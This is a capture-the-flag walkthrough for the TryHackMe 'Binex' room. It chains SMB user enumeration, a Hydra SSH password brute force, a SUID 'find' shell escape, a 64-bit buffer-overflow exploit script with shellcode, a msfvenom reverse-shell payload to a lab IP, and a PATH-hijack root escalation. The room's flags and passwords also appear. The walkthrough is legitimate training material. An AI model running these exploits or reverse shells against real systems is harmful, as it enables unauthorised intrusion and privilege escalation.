> Binex | Linux Binary Exploit

# Nmap

nmap -sC -sV -A -T4 -Pn -vvv $IP -oN nmap/initial

```
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

Tried to login to SMB account and nothing interesting in the shares. Let's run enum4linux

# enum4linux

**Note: Without looking at the hint I just ran it whole but if we look at the hint it says RID range 1000-1003**

enum4linux -R 1000-1003 binex.thm

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
```

And from Hint 2 it is the longest username which is `tryhackme`. So we have a username and tried running against SMB but failed. So moved onto SSH.

# Hail Hydra!

hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt binex.thm ssh

```
[22][ssh] host: binex.thm   login: tryhackme   password: thebest
```

We can login to SSH and we are in as `tryhackme`. Let's search for SUID bits for user des.

find / -perm -u=s -type f -user des -ls 2>/dev/null

```
262721    236 -rwsr-sr-x   1 des      des        238080 Nov  5  2017 /usr/bin/find
```

Let's look at GTFO bin and find exploits for SUID.

```
sudo install -m =xs $(which find) .
./find . -exec /bin/sh -p \; -quit
```

And on modifying we get `find . -exec /bin/sh -p \; -quit`. We are in as des.

flag.txt

```
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
```

We got 2 files. `bof` suid elf file owned by kel and `bof64.c` which is the source code. On examining it, we get to know that it reads input to 1000 but buffer size is 600.

# bof64.c 

```
#include <stdio.h>
#include <unistd.h>

int foo(){
	char buffer[600];
	int characters_read;
	printf("Enter some string:\n");
	characters_read = read(0, buffer, 1000);
	printf("You entered: %s", buffer);
	return 0;
}

void main(){
	setresuid(geteuid(), geteuid(), geteuid());
    	setresgid(getegid(), getegid(), getegid());

	foo();
}
```

So basically if we try to input more than 600 bytes we get segmentaion fault. So the limit is 1000.
Let's run it through gdb. `gdb -q ./bof`

1. set disassembly-flavor intel => For easy reading of data
2. r < <(python -c 'print("A" * 1000)') (or) run < <(python -c 'print("A" * 1000)')

```
Starting program: /home/des/bof < <(python -c 'print("A" * 1000)')
Enter some string:

Program received signal SIGSEGV, Segmentation fault.
0x000055555555484e in foo ()
```

3. i r (or) info register

```
rax            0x0	0
rbx            0x3e9	1001
rcx            0x0	0
rdx            0x0	0
rsi            0x555555554956	93824992233814
rdi            0x7ffff7dd0760	140737351845728
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffe498	0x7fffffffe498
r8             0xffffffffffffffed	-19
r9             0x25e	606
r10            0x5555557564cb	93824994337995
r11            0x555555554956	93824992233814
r12            0x3e9	1001
r13            0x7fffffffe590	140737488348560
r14            0x0	0
r15            0x0	0
rip            0x55555555484e	0x55555555484e <foo+84>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```

We can see that rbp (base pointer) is overwritten by our `A`.

**Note: GDB - x command
Displays the memory contents at a given address using the specified format.
Address expression
    Specifies the memory address which contents will be displayed. This can be the address itself or any C/C++ expression evaluating to address. The expression can include registers (e.g. $eip) and pseudoregisters (e.g. $pc). If the address expression is not specified, the command will continue displaying memory contents from the address where the previous instance of this command has finished.
Format
    If specified, allows overriding the output format used by the command. Valid format specifiers are:
    o - octal
    x - hexadecimal
    d - decimal
    u - unsigned decimal
    t - binary
    f - floating point
    a - address
    c - char
    s - string
    i - instruction
The following size modifiers are supported:
    b - byte
    h - halfword (16-bit value)
    w - word (32-bit value)
    g - giant word (64-bit value)
Length
    Specifies the number of elements that will be displayed by this command.**

4. x/xg $rsp

```
0x7fffffffe498:	0x4141414141414141
```

5. x/i $rip

```
=> 0x55555555484e <foo+84>:	ret
```

6. Let's find out the offset of the RSP value that is going to be loaded into the RIP register. 

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B	
```

7. Let's run it again . 

r < <(echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B)

8. Let's check the registers again.

i r

```
rax            0x0	0
rbx            0x3e9	1001
rcx            0x0	0
rdx            0x0	0
rsi            0x555555554956	93824992233814
rdi            0x7ffff7dd0760	140737351845728
rbp            0x4134754133754132	0x4134754133754132 => RBP overflown
rsp            0x7fffffffe498	0x7fffffffe498
r8             0xffffffffffffffed	-19
r9             0x25e	606
r10            0x5555557564cb	93824994337995
r11            0x555555554956	93824992233814
r12            0x3e9	1001
r13            0x7fffffffe590	140737488348560
r14            0x0	0
r15            0x0	0
---Type <return> to continue, or q <return> to quit---
rip            0x55555555484e	0x55555555484e <foo+84>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```

9. Take content from rbp and calculate offset.

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 4134754133754132

```
[*] Exact match at offset 608
```

10. We need a shellcode. Let's create one with msfvenom.

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.107.21 LPORT=1234 -b '\x00' -f python

```
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\xcb\xd1\x48\xfc\x91\x05\xa5"
buf += b"\x69\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\xa1\xf8\x10\x65\xfb\x07\xfa\x03\xca\x8f\x47\xf9\xd9"
buf += b"\x92\xed\xd0\xc9\xd1\x4c\x2e\x9b\x0d\xce\x7c\x9a\x99"
buf += b"\xc1\x1a\xfb\x15\xff\x03\xe1\x89\x47\xf9\xfb\x06\xfb"
buf += b"\x21\x34\x1f\x22\xdd\xc9\x0a\xa0\x1c\x3d\xbb\x73\xa4"
buf += b"\x08\x4d\x1e\x46\xa9\xb8\x26\xd3\xe2\x6d\xa5\x3a\x83"
buf += b"\x58\xaf\xae\xc6\x4d\x2c\x8f\xc4\xd4\x48\xfc\x91\x05"
buf += b"\xa5\x69"
```

# exploit.py

```
from struct import pack
#buf="\xcc"*8
buf="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload="\x90"*400
payload += buf
payload += "A" * (208 -len(buf))
payload += "B" *8
payload += pack("<Q", 0x7fffffffe300)

print payload
```

python exploit.py >test
(cat test;cat) | ./bof

And we can execute commands.

# Flag.txt

```
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265
```

In kel's directory we can see a setuid binary owned by root called `exe`. And it executes ps command which we can see by executing it.

The argument passed into the system function is not specifying an absolute path so it will use the value of the current user's environment variable PATH in order to find where the executable ps is. This can be exploited by an attacker because they can simply make an executable in the current directory, name it ps, edit the PATH variable so that instead of executing the real ps it will execute ours which will have our payload in it.

# Steps

1. cd /tmp
2. echo "/bin/bash" > ps
3. chmod +x ps
4. export PATH=/tmp:$PATH
5. ./exe

And we are root!!

# root.txt

```
The flag: THM{SUID_binary_and_PATH_exploit}. 
Also, thank you for your participation.

The room is built with love. DesKel out.
```